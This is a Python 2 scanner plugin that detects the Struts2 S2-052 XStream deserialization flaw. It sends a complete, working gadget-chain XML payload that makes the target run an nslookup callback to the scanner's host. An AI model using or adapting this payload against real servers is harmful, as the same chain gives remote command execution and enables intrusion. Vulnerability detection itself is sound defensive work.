# coding=utf-8
import urllib2
import random
import socket
import time


def get_plugin_info():
    plugin_info = {
        "name": "Struts2 052远程代码执行",
        "info": "当启用 Struts REST的XStream handler去反序列化处理XML请求，可能造成远程代码执行漏洞，进而直接导致服务器被入侵控制。",
        "level": "紧急",
        "type": "代码执行",
        "author": "wolf@YSRC",
        "url": "http://bobao.360.cn/news/detail/4291.html",
        "keyword": "tag:tomcat",
        "source": 1
    }
    return plugin_info


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr


def check(ip, port, timeout):
    if port == 443:
        url = "https://%s" % (ip)
    else:
        url = "http://%s:%d" % (ip, port)
    test_str = random_str(6)
    server_ip = get_ver_ip(ip)
    post_data = """<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>nslookup</string><string>%s</string><string>%s</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>""" % (test_str, server_ip)
    res = urllib2.urlopen(url, timeout=timeout)
    url = res.geturl()
    if "Set-Cookie" in res.headers and "JSESSIONID" in res.headers["Set-Cookie"]:
        request = urllib2.Request(url, post_data)
        request.add_header("Content-Type", "application/xml")
        try:
            urllib2.urlopen(request, timeout=timeout)
        except Exception, e:
            if e.code == 500:
                time.sleep(2)
                check = urllib2.urlopen("http://%s:8088/%s" % (server_ip, test_str), timeout=timeout).read()
                if "YES" in check:
                    return u"S2-052 远程代码执行漏洞"
